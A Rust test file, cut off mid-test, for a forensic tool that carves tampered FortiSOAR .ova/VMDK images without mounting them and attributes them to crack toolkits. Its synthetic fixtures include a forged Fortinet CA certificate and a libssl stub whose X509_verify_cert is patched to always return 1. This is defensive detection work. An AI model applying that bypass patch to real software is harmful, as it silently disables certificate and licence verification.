//! Comprehensive Unit & Zero-Mount Integration Tests for `fsr-ova-attribution` (Phase 8).
//!
//! Verifies:
//!   1. Userspace POSIX `ustar` `.ova` streaming (`ova_stream_inspector`), `.mf` SHA-1/SHA-256
//!      tamper detection (`CRITICAL_OVA_MANIFEST_TAMPERED`), and `.ovf` hardware spoofing extraction.
//!   2. Binary `VMDK4` (`KDMV` - `0x564d444b`) header + embedded descriptor parsing and
//!      sliding-window carving (`vmdk_carver`) across chunk boundaries for `pg_control` (with
//!      Castagnoli CRC-32C), XFS (`XFSB`) & EXT4 (`0xEF53`) superblocks, X.509 DER rogue CAs /
//!      pirated `FGVM` serials, and patched ELF64 `libssl.so.3` / `pam_unix.so` binaries, plus
//!      RFC 1950/1951 zlib-compressed `streamOptimized` grain decompression.
//!   3. Cross-institution **Crack-Kit DNA** (`CKIT-SHA256-...`) threat attribution
//!      (`cracker_attribution`) proving two separate appliances with **different** `pg_control`
//!      `system_identifier`s, different RSA keys/serials, different compile timestamps, and
//!      different C2 endpoints cluster under the identical `crack_kit_signature_id` and emit
//!      `CRITICAL_SAME_CRACKER_TOOLKIT_ATTRIBUTION`.

use std::fs;
use std::io::Cursor;
use std::path::{Path, PathBuf};
use std::time::{SystemTime, UNIX_EPOCH};

use fsr_deep_audit::crypto::{crc32c, sha1_hex, sha256_hex};
use fsr_ova_attribution::cracker_attribution::run_cracker_attribution_engine;
use fsr_ova_attribution::ova_stream_inspector::inspect_ova_stream;
use fsr_ova_attribution::vmdk_carver::{carve_disk_stream, inflate_zlib_limited, VMDK_SPARSE_MAGIC};
use fsr_ova_attribution::{execute_ova_attribution_suite, OvaAttributionConfig};

// ============================================================================
// Synthetic Binary Test-Vector Builders (Zero External Crates)
// ============================================================================

/// Writes an 8-byte / 12-byte octal field into a 512-byte POSIX `ustar` header.
fn write_octal(slot: &mut [u8], val: u64) {
    let width = slot.len() - 1;
    let s = format!("{:0width$o}", val, width = width);
    let bytes = s.as_bytes();
    let copy_len = bytes.len().min(width);
    slot[..copy_len].copy_from_slice(&bytes[bytes.len() - copy_len..]);
    slot[copy_len] = 0;
}

/// Appends a single regular file entry (`typeflag = '0'`) to an in-memory POSIX `ustar` archive.
fn push_ustar_member(archive: &mut Vec<u8>, name: &str, mtime: u64, payload: &[u8]) {
    let mut hdr = [0u8; 512];
    let name_bytes = name.as_bytes();
    hdr[..name_bytes.len()].copy_from_slice(name_bytes);
    write_octal(&mut hdr[100..108], 0o644);
    write_octal(&mut hdr[108..116], 0);
    write_octal(&mut hdr[116..124], 0);
    write_octal(&mut hdr[124..136], payload.len() as u64);
    write_octal(&mut hdr[136..148], mtime);
    hdr[148..156].fill(b' ');
    hdr[156] = b'0';
    hdr[257..263].copy_from_slice(b"ustar\0");
    hdr[263..265].copy_from_slice(b"00");

    let chksum: u32 = hdr.iter().map(|&b| b as u32).sum();
    let chk_str = format!("{:06o}\0 ", chksum);
    hdr[148..156].copy_from_slice(chk_str.as_bytes());

    archive.extend_from_slice(&hdr);
    archive.extend_from_slice(payload);
    let rem = payload.len() % 512;
    if rem != 0 {
        archive.resize(archive.len() + (512 - rem), 0);
    }
}

fn finish_ustar_archive(archive: &mut Vec<u8>) {
    archive.extend_from_slice(&[0u8; 1024]);
}

/// Builds an 8192-byte PostgreSQL 13 `pg_control` block with valid Castagnoli CRC-32C at `+288`.
fn build_pg_control_8192(system_id: u64, control_ts: i64) -> [u8; 8192] {
    let mut buf = [0u8; 8192];
    buf[0..8].copy_from_slice(&system_id.to_le_bytes());
    buf[8..12].copy_from_slice(&1300u32.to_le_bytes()); // pg_control_version = PG 13
    buf[12..16].copy_from_slice(&202007201u32.to_le_bytes()); // catalog_version_no
    buf[16..20].copy_from_slice(&1u32.to_le_bytes()); // DB_SHUTDOWNED
    buf[24..32].copy_from_slice(&control_ts.to_le_bytes());
    buf[32..40].copy_from_slice(&0x0000_0001_0200_0098u64.to_le_bytes());
    let crc = crc32c(&buf[..288]);
    buf[288..292].copy_from_slice(&crc.to_le_bytes());
    buf
}

/// Builds a 512-byte XFS v5 primary superblock (`"XFSB"`).
fn build_xfs_v5_superblock(uuid: [u8; 16], meta_uuid: [u8; 16], label: &str) -> [u8; 512] {
    let mut sb = [0u8; 512];
    sb[0..4].copy_from_slice(b"XFSB");
    sb[4..8].copy_from_slice(&4096u32.to_be_bytes()); // sb_blocksize = 4096
    sb[8..16].copy_from_slice(&1048576u64.to_be_bytes()); // sb_dblocks
    sb[0x20..0x30].copy_from_slice(&uuid);
    sb[0x64..0x66].copy_from_slice(&0x0005u16.to_be_bytes()); // XFS v5
    sb[0x66..0x68].copy_from_slice(&512u16.to_be_bytes()); // sb_sectsize = 512
    let lbl = label.as_bytes();
    sb[0x6C..0x6C + lbl.len().min(12)].copy_from_slice(&lbl[..lbl.len().min(12)]);
    sb[0x140..0x150].copy_from_slice(&meta_uuid);
    sb
}

/// Builds a 1024-byte EXT4 superblock (`0xEF53` at `+0x38`) with `s_mkfs_time`.
fn build_ext4_superblock(uuid: [u8; 16], mkfs_time: u32, label: &str) -> [u8; 1024] {
    let mut sb = [0u8; 1024];
    sb[0..4].copy_from_slice(&65536u32.to_le_bytes()); // s_inodes_count
    sb[4..8].copy_from_slice(&262144u32.to_le_bytes()); // s_blocks_count_lo
    sb[0x18..0x1c].copy_from_slice(&2u32.to_le_bytes()); // 4096B blocks
    sb[0x2c..0x30].copy_from_slice(&(mkfs_time + 120).to_le_bytes());
    sb[0x30..0x34].copy_from_slice(&(mkfs_time + 300).to_le_bytes());
    sb[0x38..0x3a].copy_from_slice(&0xEF53u16.to_le_bytes());
    sb[0x4c..0x50].copy_from_slice(&1u32.to_le_bytes()); // dynamic rev
    sb[0x68..0x78].copy_from_slice(&uuid);
    let lbl = label.as_bytes();
    sb[0x78..0x78 + lbl.len().min(16)].copy_from_slice(&lbl[..lbl.len().min(16)]);
    sb[0x108..0x10c].copy_from_slice(&mkfs_time.to_le_bytes());
    sb
}

/// Builds a compact spec-compliant x86_64 `ET_DYN` ELF64 shared library exporting `(sym_name, stub)`.
fn build_elf64_shared_object(symbols: &[(&str, &[u8])]) -> Vec<u8> {
    let mut buf = vec![0u8; 0x1800];
    let text_off = 0x0400usize;
    let dynstr_off = 0x0800usize;
    let dynsym_off = 0x0A00usize;
    let shstr_off = 0x0E00usize;
    let shoff = 0x1000usize;

    let mut dynstr = vec![0u8];
    let mut dynsym = vec![0u8; 24]; // STN_UNDEF

    for (idx, (name, code)) in symbols.iter().enumerate() {
        let fn_off = text_off + idx * 64;
        buf[fn_off..fn_off + code.len()].copy_from_slice(code);

        let name_idx = dynstr.len() as u32;
        dynstr.extend_from_slice(name.as_bytes());
        dynstr.push(0);

        let mut sym = [0u8; 24];
        sym[0..4].copy_from_slice(&name_idx.to_le_bytes());
        sym[4] = 0x12; // STB_GLOBAL | STT_FUNC
        sym[6..8].copy_from_slice(&1u16.to_le_bytes()); // .text
        sym[8..16].copy_from_slice(&(fn_off as u64).to_le_bytes());
        sym[16..24].copy_from_slice(&(code.len() as u64).to_le_bytes());
        dynsym.extend_from_slice(&sym);
    }

    buf[dynstr_off..dynstr_off + dynstr.len()].copy_from_slice(&dynstr);
    buf[dynsym_off..dynsym_off + dynsym.len()].copy_from_slice(&dynsym);
    let shstr = b"\0.text\0.dynstr\0.dynsym\0.shstrtab\0";
    buf[shstr_off..shstr_off + shstr.len()].copy_from_slice(shstr);

    // 1 PT_LOAD segment (`0x0..0x1000`)
    let phoff = 0x0040usize;
    buf[phoff..phoff + 4].copy_from_slice(&1u32.to_le_bytes()); // PT_LOAD
    buf[phoff + 4..phoff + 8].copy_from_slice(&5u32.to_le_bytes()); // PF_R | PF_X
    buf[phoff + 32..phoff + 40].copy_from_slice(&0x1000u64.to_le_bytes());
    buf[phoff + 40..phoff + 48].copy_from_slice(&0x1000u64.to_le_bytes());
    buf[phoff + 48..phoff + 56].copy_from_slice(&0x1000u64.to_le_bytes());

    let write_sh = |dst: &mut [u8], name: u32, ty: u32, off: usize, sz: usize, link: u32, ent: u64| {
        dst[0..4].copy_from_slice(&name.to_le_bytes());
        dst[4..8].copy_from_slice(&ty.to_le_bytes());
        dst[16..24].copy_from_slice(&(off as u64).to_le_bytes());
        dst[24..32].copy_from_slice(&(off as u64).to_le_bytes());
        dst[32..40].copy_from_slice(&(sz as u64).to_le_bytes());
        dst[40..44].copy_from_slice(&link.to_le_bytes());
        dst[56..64].copy_from_slice(&ent.to_le_bytes());
    };
    write_sh(&mut buf[shoff + 64..shoff + 128], 1, 1, text_off, 256, 0, 0);
    write_sh(&mut buf[shoff + 128..shoff + 192], 7, 3, dynstr_off, dynstr.len(), 0, 0);
    write_sh(&mut buf[shoff + 192..shoff + 256], 15, 11, dynsym_off, dynsym.len(), 2, 24);
    write_sh(&mut buf[shoff + 256..shoff + 320], 23, 3, shstr_off, shstr.len(), 0, 0);

    buf[0..7].copy_from_slice(b"\x7fELF\x02\x01\x01");
    buf[16..18].copy_from_slice(&3u16.to_le_bytes()); // ET_DYN
    buf[18..20].copy_from_slice(&62u16.to_le_bytes()); // EM_X86_64
    buf[20..24].copy_from_slice(&1u32.to_le_bytes());
    buf[24..32].copy_from_slice(&(text_off as u64).to_le_bytes());
    buf[32..40].copy_from_slice(&(phoff as u64).to_le_bytes());
    buf[40..48].copy_from_slice(&(shoff as u64).to_le_bytes());
    buf[52..54].copy_from_slice(&64u16.to_le_bytes());
    buf[54..56].copy_from_slice(&56u16.to_le_bytes());
    buf[56..58].copy_from_slice(&1u16.to_le_bytes()); // e_phnum = 1
    buf[58..60].copy_from_slice(&64u16.to_le_bytes());
    buf[60..62].copy_from_slice(&5u16.to_le_bytes()); // e_shnum = 5
    buf[62..64].copy_from_slice(&4u16.to_le_bytes()); // e_shstrndx = 4
    buf
}

fn der_tlv(tag: u8, val: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(4 + val.len());
    out.push(tag);
    if val.len() < 128 {
        out.push(val.len() as u8);
    } else if val.len() < 256 {
        out.push(0x81);
        out.push(val.len() as u8);
    } else {
        out.push(0x82);
        out.extend_from_slice(&(val.len() as u16).to_be_bytes());
    }
    out.extend_from_slice(val);
    out
}

/// Builds a self-signed X.509v3 DER certificate (> 512 bytes so outer TLV uses `0x30 0x82`)
/// with caller-chosen RDN order (`org_first`), UTCTime validity strings, serial bytes, and key seed.
#[allow(clippy::too_many_arguments)]
fn build_custom_x509_der(
    serial_bytes: &[u8],
    org: &str,
    cn: &str,
    org_first: bool,
    not_before_utc: &[u8],
    not_after_utc: &[u8],
    is_ca: bool,
    spki_seed: u8,
) -> Vec<u8> {
    let oid_sha256_rsa = &[0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x0b];
    let oid_rsa_enc = &[0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x01];
    let oid_org = &[0x55, 0x04, 0x0a];
    let oid_cn = &[0x55, 0x04, 0x03];
    let oid_bc = &[0x55, 0x1d, 0x13];

    let rdn_attr = |oid: &[u8], text: &str| -> Vec<u8> {
        let mut seq_body = der_tlv(0x06, oid);
        seq_body.extend_from_slice(&der_tlv(0x0c, text.as_bytes()));
        der_tlv(0x31, &der_tlv(0x30, &seq_body))
    };

    let mut name_body = Vec::new();
    if org_first {
        name_body.extend_from_slice(&rdn_attr(oid_org, org));
        name_body.extend_from_slice(&rdn_attr(oid_cn, cn));
    } else {
        name_body.extend_from_slice(&rdn_attr(oid_cn, cn));
        name_body.extend_from_slice(&rdn_attr(oid_org, org));
    }
    let name_der = der_tlv(0x30, &name_body);

    let mut sig_alg_body = der_tlv(0x06, oid_sha256_rsa);
    sig_alg_body.extend_from_slice(&[0x05, 0x00]);
    let sig_alg = der_tlv(0x30, &sig_alg_body);

    let mut val_body = der_tlv(0x17, not_before_utc);
    val_body.extend_from_slice(&der_tlv(0x17, not_after_utc));
    let validity = der_tlv(0x30, &val_body);

    let mut modulus = vec![0x00u8; 257];
    modulus[1] = 0xc0 | (spki_seed & 0x3f);
    for (i, b) in modulus[2..256].iter_mut().enumerate() {
        *b = spki_seed.wrapping_mul(37).wrapping_add(i as u8);
    }
    modulus[256] = 0x01;
    let mut rsa_seq_body = der_tlv(0x02, &modulus);
    rsa_seq_body.extend_from_slice(&der_tlv(0x02, &[0x01, 0x00, 0x01]));
    let rsa_pub = der_tlv(0x30, &rsa_seq_body);
    let mut spki_bits = vec![0x00];
    spki_bits.extend_from_slice(&rsa_pub);

    let mut alg_id_body = der_tlv(0x06, oid_rsa_enc);
    alg_id_body.extend_from_slice(&[0x05, 0x00]);
    let mut spki_body = der_tlv(0x30, &alg_id_body);
    spki_body.extend_from_slice(&der_tlv(0x03, &spki_bits));
    let spki = der_tlv(0x30, &spki_body);

    let bc_val = if is_ca {
        der_tlv(0x30, &[0x01, 0x01, 0xff])
    } else {
        der_tlv(0x30, &[])
    };
    let mut bc_ext_body = der_tlv(0x06, oid_bc);
    bc_ext_body.extend_from_slice(&[0x01, 0x01, 0xff]);
    bc_ext_body.extend_from_slice(&der_tlv(0x04, &bc_val));
    let ext_explicit = der_tlv(0xa3, &der_tlv(0x30, &der_tlv(0x30, &bc_ext_body)));

    let mut serial_pos = Vec::new();
    if serial_bytes.first().map(|b| (b & 0x80) != 0).unwrap_or(true) {
        serial_pos.push(0x00);
    }
    serial_pos.extend_from_slice(serial_bytes);

    let mut tbs_body = Vec::new();
    tbs_body.extend_from_slice(&der_tlv(0xa0, &der_tlv(0x02, &[0x02])));
    tbs_body.extend_from_slice(&der_tlv(0x02, &serial_pos));
    tbs_body.extend_from_slice(&sig_alg);
    tbs_body.extend_from_slice(&name_der);
    tbs_body.extend_from_slice(&validity);
    tbs_body.extend_from_slice(&name_der);
    tbs_body.extend_from_slice(&spki);
    tbs_body.extend_from_slice(&ext_explicit);
    let tbs = der_tlv(0x30, &tbs_body);

    let mut sig_bits = vec![0u8; 257];
    for (i, b) in sig_bits[1..].iter_mut().enumerate() {
        *b = spki_seed.wrapping_add((i as u8).wrapping_mul(19));
    }

    let mut cert_body = Vec::new();
    cert_body.extend_from_slice(&tbs);
    cert_body.extend_from_slice(&sig_alg);
    cert_body.extend_from_slice(&der_tlv(0x03, &sig_bits));
    der_tlv(0x30, &cert_body)
}

/// Wraps DER bytes in RFC 4648 PEM `CERTIFICATE` armor.
fn der_to_pem(der: &[u8]) -> String {
    const LUT: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut b64 = String::new();
    for chunk in der.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
        let triple = (b0 << 16) | (b1 << 8) | b2;
        b64.push(LUT[((triple >> 18) & 0x3f) as usize] as char);
        b64.push(LUT[((triple >> 12) & 0x3f) as usize] as char);
        b64.push(if chunk.len() > 1 {
            LUT[((triple >> 6) & 0x3f) as usize] as char
        } else {
            '='
        });
        b64.push(if chunk.len() > 2 {
            LUT[(triple & 0x3f) as usize] as char
        } else {
            '='
        });
    }
    let mut out = String::from("-----BEGIN CERTIFICATE-----\n");
    for chunk in b64.as_bytes().chunks(64) {
        out.push_str(std::str::from_utf8(chunk).unwrap());
        out.push('\n');
    }
    out.push_str("-----END CERTIFICATE-----\n");
    out
}

/// Builds a binary `VMDK4` (`KDMV` = `0x564d444b`, `#pragma pack(1)`) sparse disk image.
fn build_vmdk4_sparse_extent(
    embedded_descriptor: &str,
    compress_algorithm: u16,
    flags: u32,
    overhead_sectors: u64,
    payload_after_overhead: &[u8],
) -> Vec<u8> {
    let overhead_bytes = (overhead_sectors as usize) * 512;
    let mut disk = vec![0u8; overhead_bytes + payload_after_overhead.len()];

    // `#pragma pack(1)` SparseExtentHeader at sector 0 (`0..512`)
    disk[0..4].copy_from_slice(&VMDK_SPARSE_MAGIC.to_le_bytes()); // "KDMV"
    disk[4..8].copy_from_slice(&3u32.to_le_bytes()); // version = 3
    disk[8..12].copy_from_slice(&flags.to_le_bytes());
    disk[12..20].copy_from_slice(&20971520u64.to_le_bytes()); // 10 GiB capacity in sectors
    disk[20..28].copy_from_slice(&128u64.to_le_bytes()); // 64 KiB grainSize
    disk[28..36].copy_from_slice(&1u64.to_le_bytes()); // descriptorOffset = sector 1
    disk[36..44].copy_from_slice(&20u64.to_le_bytes()); // descriptorSize = 20 sectors
    disk[44..48].copy_from_slice(&512u32.to_le_bytes()); // numGTEsPerGT
    disk[56..64].copy_from_slice(&0xFFFF_FFFF_FFFF_FFFFu64.to_le_bytes()); // gdOffset = GD_AT_END
    disk[64..72].copy_from_slice(&overhead_sectors.to_le_bytes()); // overHead
    disk[73] = b'\n';
    disk[74] = b' ';
    disk[75] = b'\r';
    disk[76] = b'\n';
    disk[77..79].copy_from_slice(&compress_algorithm.to_le_bytes());

    let desc_bytes = embedded_descriptor.as_bytes();
    disk[512..512 + desc_bytes.len()].copy_from_slice(desc_bytes);
    disk[overhead_bytes..].copy_from_slice(payload_after_overhead);
    disk
}

/// Encodes raw bytes into a valid RFC 1950 zlib stream using RFC 1951 stored blocks (`BTYPE=00`).
fn build_rfc1950_zlib_stored(raw: &[u8]) -> Vec<u8> {
    let mut out = vec![0x78, 0x01]; // CMF=0x78 (deflate, 32K), FLG=0x01 ((0x7801 % 31) == 0)
    let chunks: Vec<&[u8]> = if raw.is_empty() {
        vec![&[]]
    } else {
        raw.chunks(32768).collect()
    };
    for (idx, chunk) in chunks.iter().enumerate() {
        let is_last = idx + 1 == chunks.len();
        out.push(if is_last { 0x01 } else { 0x00 }); // BFINAL | BTYPE=00
        let len = chunk.len() as u16;
        let nlen = !len;
        out.extend_from_slice(&len.to_le_bytes());
        out.extend_from_slice(&nlen.to_le_bytes());
        out.extend_from_slice(chunk);
    }
    // RFC 1950 Adler-32 trailer
    let mut s1 = 1u32;
    let mut s2 = 0u32;
    for &b in raw {
        s1 = (s1 + (b as u32)) % 65521;
        s2 = (s2 + s1) % 65521;
    }
    let adler = (s2 << 16) | s1;
    out.extend_from_slice(&adler.to_be_bytes());
    out
}

fn build_pep552_pyc311_return_true(mtime: u32) -> Vec<u8> {
    let mut pyc = Vec::new();
    pyc.extend_from_slice(&3495u16.to_le_bytes());
    pyc.extend_from_slice(&[0x0d, 0x0a]);
    pyc.extend_from_slice(&0u32.to_le_bytes());
    pyc.extend_from_slice(&mtime.to_le_bytes());
    pyc.extend_from_slice(&128u32.to_le_bytes());
    pyc.extend_from_slice(&[b'c', 0, 0, 0, 0, b's', 6, 0, 0, 0, 151, 0, 100, 1, 83, 0, b')', 2, b'N', b'T']);
    pyc
}

fn temp_test_dir(tag: &str) -> PathBuf {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let dir = std::env::temp_dir().join(format!(
        "fsr_ova_attr_test_{}_{}_{}",
        tag,
        std::process::id(),
        nanos
    ));
    fs::create_dir_all(&dir).unwrap();
    dir
}

// ============================================================================
// Test 1: Zero-Mount POSIX `ustar` `.ova` + `.ovf` + `.mf` + `VMDK4` Carving
// ============================================================================

#[test]
fn test_zero_mount_ustar_ova_vmdk4_carving_and_manifest_tamper_detection() {
    let ovf_xml = r#"<?xml version="1.0" encoding="UTF-8"?>
<Envelope xmlns="http://schemas.dmtf.org/ovf/envelope/1"
          xmlns:ovf="http://schemas.dmtf.org/ovf/envelope/1"
          xmlns:rasd="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/CIM_ResourceAllocationSettingData"
          xmlns:vssd="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/CIM_VirtualSystemSettingData"
          xmlns:vmw="http://www.vmware.com/schema/ovf">
  <References>
    <File ovf:href="FortiSOAR-disk1.vmdk" ovf:id="file1"/>
  </References>
  <DiskSection>
    <Disk ovf:capacity="100" ovf:capacityAllocationUnits="byte * 2^30" ovf:diskId="vmdisk1" ovf:fileRef="file1" ovf:format="http://www.vmware.com/interfaces/specifications/vmdk.html#streamOptimized"/>
  </DiskSection>
  <VirtualSystem ovf:id="FortiSOAR-Cracked-Appliance">
    <Name>fsr-ova-zero-mount-target</Name>
    <OperatingSystemSection ovf:id="80">
      <Description>Rocky Linux 9 (64-bit)</Description>
    </OperatingSystemSection>
    <VirtualHardwareSection>
      <System>
        <vssd:VirtualSystemIdentifier>4210aabb-ccdd-eeff-1122-334455667788</vssd:VirtualSystemIdentifier>
        <vssd:VirtualSystemType>vmx-19</vssd:VirtualSystemType>
      </System>
      <Item>
        <rasd:ResourceType>3</rasd:ResourceType>
        <rasd:VirtualQuantity>8</rasd:VirtualQuantity>
        <rasd:Limit>8</rasd:Limit>
      </Item>
      <Item>
        <rasd:ResourceType>4</rasd:ResourceType>
        <rasd:AllocationUnits>byte * 2^20</rasd:AllocationUnits>
        <rasd:VirtualQuantity>32768</rasd:VirtualQuantity>
      </Item>
      <Item>
        <rasd:Address>00:0c:29:de:ad:ef</rasd:Address>
        <rasd:AutomaticAllocation>false</rasd:AutomaticAllocation>
        <rasd:ElementName>eth0</rasd:ElementName>
        <rasd:ResourceSubType>VmxNet3</rasd:ResourceSubType>
        <rasd:ResourceType>10</rasd:ResourceType>
      </Item>
      <vmw:ExtraConfig vmw:key="uuid.bios" vmw:value="56 4d aa bb cc dd ee ff-11 22 33 44 55 66 77 88"/>
    </VirtualHardwareSection>
  </VirtualSystem>
</Envelope>"#;

    let vmdk_desc = "# Disk DescriptorFile\nversion=1\nCID=89abcdef\nparentCID=ffffffff\ncreateType=\"monolithicSparse\"\n\nRW 20971520 SPARSE \"FortiSOAR-disk1.vmdk\"\nddb.adapterType = \"lsilogic\"\nddb.virtualHWVersion = \"19\"\nddb.uuid.image=\"11223344-5566-7788-99aa-bbccddeeff00\"\n";

    // Build raw extent data > 140 KiB so carved artifacts straddle the 128 KiB streaming chunk boundary!
    let mut extent_data = vec![0u8; 196_608];

    // 1) XFS v5 Superblock at sector offset `0x2000`
    let xfs_sb = build_xfs_v5_superblock(
        [0xaa, 0xbb, 0xcc, 0xdd, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0x00, 0xab, 0xcd],
        [0xfe, 0xdc, 0xba, 0x98, 0x76, 0x54, 0x32, 0x10, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88],
        "fsr_root",
    );
    extent_data[0x2000..0x2200].copy_from_slice(&xfs_sb);

    // 2) EXT4 Superblock at `0x4000` (`s_mkfs_time = 1715000000`)
    let ext4_sb = build_ext4_superblock(
        [0x10, 0x20, 0x30, 0x40, 0x50, 0x60, 0x70, 0x80, 0x90, 0xa0, 0xb0, 0xc0, 0xd0, 0xe0, 0xf0, 0x01],
        1_715_000_000,
        "fsr_boot",
    );
    extent_data[0x4000..0x4400].copy_from_slice(&ext4_sb);

    // 3) PostgreSQL 8192-byte `pg_control` right across the 128 KiB (`0x20000`) chunk boundary!
    //    (Since `overhead` is 128 sectors = `0x10000`, `0x10000 + 0x0F800 = 0x1F800..0x21800` crosses `0x20000`!)
    let pg_ctrl = build_pg_control_8192(7_384_920_192_837_465_101, 1_720_000_000);
    extent_data[0x0F800..0x0F800 + 8192].copy_from_slice(&pg_ctrl);

    // 4) Rogue Fortinet Root CA + pirated `FGVM080000000000` DER certificate at `0x14000`
    let rogue_ca_der = build_custom_x509_der(
        &[0x41, 0x92, 0xa0, 0xcc, 0x11, 0x22, 0x33, 0x44],
        "Fortinet",
        "FGVM080000000000",
        true,
        b"250301120000Z",
        b"350227120000Z",
        true,
        0x33,
    );
    extent_data[0x14000..0x14000 + rogue_ca_der.len()].copy_from_slice(&rogue_ca_der);

    // 5) Patched ELF64 `libssl.so.3` (`X509_verify_cert`: `endbr64; mov eax, 1; ret`) at `0x18000`
    let cet_ret_one: &[u8] = &[0xf3, 0x0f, 0x1e, 0xfa, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xc3];
    let patched_elf = build_elf64_shared_object(&[("X509_verify_cert", cet_ret_one)]);
    extent_data[0x18000..0x18000 + patched_elf.len()].copy_from_slice(&patched_elf);

    let vmdk_bytes = build_vmdk4_sparse_extent(vmdk_desc, 0, 0x3, 128, &extent_data);

    // Case A: Authentic `.mf` (verifies clean `.mf` check + full zero-mount carving)
    let valid_mf = format!(
        "SHA256(FortiSOAR-7.6.0.ovf)= {}\nSHA1(FortiSOAR-disk1.vmdk)= {}\n",
        sha256_hex(ovf_xml.as_bytes()),
        sha1_hex(&vmdk_bytes),
    );
    let mut valid_ova = Vec::new();
    push_ustar_member(&mut valid_ova, "FortiSOAR-7.6.0.ovf", 1_725_000_000, ovf_xml.as_bytes());
    push_ustar_member(&mut valid_ova, "FortiSOAR-disk1.vmdk", 1_725_000_000, &vmdk_bytes);
    push_ustar_member(&mut valid_ova, "FortiSOAR-7.6.0.mf", 1_725_000_000, valid_mf.as_bytes());
    finish_ustar_archive(&mut valid_ova);

    let out_valid =
        inspect_ova_stream("valid_test.ova", Cursor::new(&valid_ova), &[]).expect("OVA stream ok");
    assert!(out_valid.manifest_present);
    assert!(
        out_valid.manifest_authentic,
        "valid .mf must verify cleanly; findings={:?}",
        out_valid.ova_findings
    );
    assert!(
        !out_valid
            .ova_findings
            .iter()
            .any(|f| f.code == "CRITICAL_OVA_MANIFEST_TAMPERED")
    );

    // Verify OVF virtual hardware extraction + static MAC / SMBIOS spoof findings
    let hw = out_valid.ovf_hardware.as_ref().expect("OVF parsed");
    assert_eq!(hw.vcpu_count, Some(8));
    assert_eq!(hw.ram_mb, Some(32768));
    assert_eq!(hw.pinned_mac_addresses, vec!["00:0c:29:de:ad:ef".to_string()]);
    assert!(out_valid
        .ova_findings
        .iter()
        .any(|f| f.code == "HIGH_OVF_PINNED_STATIC_MAC_SPOOF"));
    assert!(out_valid
        .ova_findings
        .iter()
        .any(|f| f.code == "HIGH_OVF_CUSTOM_SMBIOS_UUID_PINNED"));

    // Verify VMDK4 header + zero-mount carved artifacts
    assert_eq!(out_valid.disk_carve_reports.len(), 1);
    let disk_rep = &out_valid.disk_carve_reports[0];
    let sparse_hdr = disk_rep.vmdk_sparse_header.as_ref().expect("KDMV header");
    assert_eq!(sparse_hdr.version, 3);
    assert_eq!(sparse_hdr.capacity_sectors, 20_971_520);
    assert_eq!(
        disk_rep
            .vmdk_descriptor
            .as_ref()
            .and_then(|d| d.create_type.as_deref()),
        Some("monolithicSparse")
    );

    // Boundary-straddling 8192-byte `pg_control` carved with valid Castagnoli CRC-32C!
    assert_eq!(disk_rep.pg_controls.len(), 1);
    assert_eq!(
        disk_rep.pg_controls[0].birthmark.system_identifier,
        7_384_920_192_837_465_101
    );
    assert!(disk_rep.pg_controls[0].birthmark.crc32c_valid);

    // Both XFS v5 and EXT4 superblocks carved!
    assert_eq!(disk_rep.superblocks.len(), 2);
    assert!(disk_rep
        .superblocks
        .iter()
        .any(|s| s.birthmark.fs_type == "xfs_v5"
            && s.birthmark.uuid == "aabbccdd-1122-3344-5566-77889900abcd"));
    assert!(disk_rep
        .superblocks
        .iter()
        .any(|s| s.birthmark.fs_type == "ext4"
            && s.birthmark.mkfs_time_unix == Some(1_715_000_000)));

    // Carved X.509 Rogue CA + forged FGVM serial + patched ELF64 `libssl`!
    let vmdk_codes: Vec<&str> = out_valid.vmdk_findings.iter().map(|f| f.code.as_str()).collect();
    assert!(vmdk_codes.contains(&"CRITICAL_VMDK_CARVED_ROGUE_CA"));
    assert!(vmdk_codes.contains(&"CRITICAL_VMDK_CARVED_FORGED_FGVM_CERT"));
    assert!(vmdk_codes.contains(&"CRITICAL_VMDK_CARVED_ELF_PATCH"));
    assert_eq!(disk_rep.elf_patches[0].idiom_code, "CET_ENDBR64_MOV_EAX_1_RET");

    // Case B: Tampered `.mf` (attacker modified `.vmdk` without valid `.mf` digest)
    let tampered_mf = format!(
        "SHA256(FortiSOAR-7.6.0.ovf)= {}\nSHA256(FortiSOAR-disk1.vmdk)= deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef\n",
        sha256_hex(ovf_xml.as_bytes()),
    );
    let mut tampered_ova = Vec::new();
    push_ustar_member(&mut tampered_ova, "FortiSOAR-7.6.0.ovf", 1_725_000_000, ovf_xml.as_bytes());
    push_ustar_member(&mut tampered_ova, "FortiSOAR-7.6.0.mf", 1_725_000_000, tampered_mf.as_bytes());
    push_ustar_member(&mut tampered_ova, "FortiSOAR-disk1.vmdk", 1_725_000_000, &vmdk_bytes);
    finish_ustar_archive(&mut tampered_ova);

    let out_tampered = inspect_ova_stream("tampered_test.ova", Cursor::new(&tampered_ova), &[])
        .expect("tampered OVA stream ok");
    assert!(!out_tampered.manifest_authentic);
    assert!(out_tampered
        .ova_findings
        .iter()
        .any(|f| f.code == "CRITICAL_OVA_MANIFEST_TAMPERED"));
}

// ============================================================================
// Test 2: Stream-Optimized VMDK (`compressAlgorithm = 1` Zlib Grain) Carving
// ============================================================================

#[test]
fn test_stream_optimized_zlib_deflate_grain_decompression_and_carving() {
    let mut raw_grain = vec![0u8; 65536];
    let pg = build_pg_control_8192(8_888_777_766_665_555_444, 1_730_000_000);
    raw_grain[4096..4096 + 8192].copy_from_slice(&pg);

    let zlib_grain = build_rfc1950_zlib_stored(&raw_grain);
    let roundtrip = inflate_zlib_limited(&zlib_grain, 65536).expect("RFC 1950 inflate");
    assert_eq!(roundtrip, raw_grain);

    // Build a `streamOptimized` compressed grain marker (`lba: u64 = 0`, `size: u32 = zlib_grain.len()`)
    let mut stream_markers = Vec::new();
    stream_markers.extend_from_slice(&0u64.to_le_bytes());
